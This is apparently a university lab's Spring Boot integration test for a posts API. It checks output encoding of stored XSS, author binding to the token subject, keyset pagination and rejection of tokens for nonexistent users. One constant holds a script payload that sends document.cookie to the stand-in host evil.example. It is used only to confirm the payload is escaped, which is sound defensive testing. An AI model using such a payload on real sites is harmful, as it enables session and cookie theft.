package org.itmo.lab1;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.jayway.jsonpath.JsonPath;
import java.util.HexFormat;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import org.itmo.lab1.application.port.in.ProvisionUserUseCase;
import org.itmo.lab1.domain.user.PasswordHash;
import org.itmo.lab1.domain.user.RawPassword;
import org.itmo.lab1.domain.user.User;
import org.itmo.lab1.domain.user.UserId;
import org.itmo.lab1.domain.user.Username;
import org.itmo.lab1.infrastructure.security.jwt.JwtTokenIssuer;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.transaction.annotation.Transactional;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles({"local", "test"})
@Transactional
class PostsFlowIntegrationTest {

    private static final String PASSWORD = "correct horse battery staple";
    private static final String XSS = "<script>fetch('https://evil.example/?c='+document.cookie)</script>";

    @Autowired
    private MockMvc mvc;

    @Autowired
    private ProvisionUserUseCase provisioning;

    @Autowired
    private JdbcTemplate jdbc;

    @Autowired
    private JwtTokenIssuer issuer;

    private final String alice = "alice_" + randomHex();
    private final String bob = "bob_" + randomHex();

    @BeforeEach
    void createUsers() {
        provisioning.ensureUserExists(new Username(alice), new RawPassword(PASSWORD));
        provisioning.ensureUserExists(new Username(bob), new RawPassword(PASSWORD));
    }

    @Test
    void storedXssIsKeptVerbatimInDatabaseButEncodedForEveryReader() throws Exception {
        long postId = createPost(login(alice), XSS);

        assertThat(jdbc.queryForObject("SELECT content FROM lab1.posts WHERE id = ?", String.class, postId))
                .isEqualTo(XSS);

        String feed = mvc.perform(get("/api/data").header(HttpHeaders.AUTHORIZATION, login(bob)))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();

        assertThat(feed).doesNotContain("<script", "document.cookie)</");
        List<String> contents = JsonPath.read(feed, "$.items[?(@.id == " + postId + ")].content");
        assertThat(contents).containsExactly(
                "&lt;script&gt;fetch(&#39;https://evil.example/?c=&#39;+document.cookie)&lt;/script&gt;");
    }

    @Test
    void authorIsAlwaysTheTokenSubject() throws Exception {
        String bobsToken = login(bob);
        long aliceId = jdbc.queryForObject("SELECT id FROM lab1.users WHERE username = ?", Long.class, alice);

        mvc.perform(post("/api/posts").header(HttpHeaders.AUTHORIZATION, bobsToken)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"content\":\"impersonation\",\"authorId\":" + aliceId + "}"))
                .andExpect(status().isBadRequest());

        long postId = createPost(bobsToken, "my own post");
        assertThat(jdbc.queryForObject(
                "SELECT u.username FROM lab1.posts p JOIN lab1.users u ON u.id = p.author_id WHERE p.id = ?",
                String.class, postId)).isEqualTo(bob);
    }

    @Test
    void feedPagesThroughRealDataWithKeysetCursor() throws Exception {
        String token = login(alice);
        long first = createPost(token, "first");
        long second = createPost(token, "second");
        long third = createPost(token, "third");

        String page1 = mvc.perform(get("/api/data?limit=2").header(HttpHeaders.AUTHORIZATION, token))
                .andExpect(status().isOk()).andReturn().getResponse().getContentAsString();
        List<Integer> page1Ids = JsonPath.read(page1, "$.items[*].id");
        Integer cursor = JsonPath.read(page1, "$.nextCursor");

        String page2 = mvc.perform(get("/api/data?limit=2&before=" + cursor).header(HttpHeaders.AUTHORIZATION, token))
                .andExpect(status().isOk()).andReturn().getResponse().getContentAsString();
        List<Integer> page2Ids = JsonPath.read(page2, "$.items[*].id");

        assertThat(page1Ids).extracting(Integer::longValue).containsExactly(third, second);
        assertThat(page2Ids.getFirst().longValue()).isEqualTo(first);
    }

    @Test
    void validlySignedTokenForNonExistentUserIsRejected() throws Exception {
        String ghostToken = "Bearer " + issuer.issue(new User(new UserId(Long.MAX_VALUE), new Username("ghost"),
                new PasswordHash("{argon2}$argon2id$x"))).value();

        mvc.perform(post("/api/posts").header(HttpHeaders.AUTHORIZATION, ghostToken)
                        .contentType(MediaType.APPLICATION_JSON).content("{\"content\":\"boo\"}"))
                .andExpect(status().isUnauthorized())
                .andExpect(header().string(HttpHeaders.WWW_AUTHENTICATE, "Bearer error=\"invalid_token\""));
    }

    private String login(String username) throws Exception {
        String body = mvc.perform(post("/auth/login").contentType(MediaType.APPLICATION_JSON)
                        .content("{\"username\":\"" + username + "\",\"password\":\"" + PASSWORD + "\"}"))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();
        return "Bearer " + JsonPath.read(body, "$.access_token");
    }

    private long createPost(String bearer, String content) throws Exception {
        String body = mvc.perform(post("/api/posts").header(HttpHeaders.AUTHORIZATION, bearer)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"content\":\"" + jsonEscape(content) + "\"}"))
                .andExpect(status().isCreated())
                .andReturn().getResponse().getContentAsString();
        return ((Number) JsonPath.read(body, "$.id")).longValue();
    }

    private static String jsonEscape(String value) {
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static String randomHex() {
        byte[] bytes = new byte[4];
        ThreadLocalRandom.current().nextBytes(bytes);
        return HexFormat.of().formatHex(bytes);
    }
}
